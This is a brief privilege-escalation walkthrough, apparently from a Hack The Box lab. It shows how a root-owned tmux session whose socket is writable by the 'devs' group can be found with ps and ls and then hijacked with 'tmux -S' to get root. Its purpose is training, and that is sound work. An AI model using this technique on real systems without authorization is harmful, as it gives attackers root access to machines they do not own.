Sometimes, a user may leave an elevated tmux session running in the background, a session that fits our previous description can be created in this way:
```
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

The result is that, if we ever compromise an account in the dev group, then we can hijack this session and gain root access

Checking for tmux:
```
ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirm target permission:
```
ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

We can see it's co-owned by user root and group devs

Finally, we attach to this tmux session

```
tmux -S /shareds
```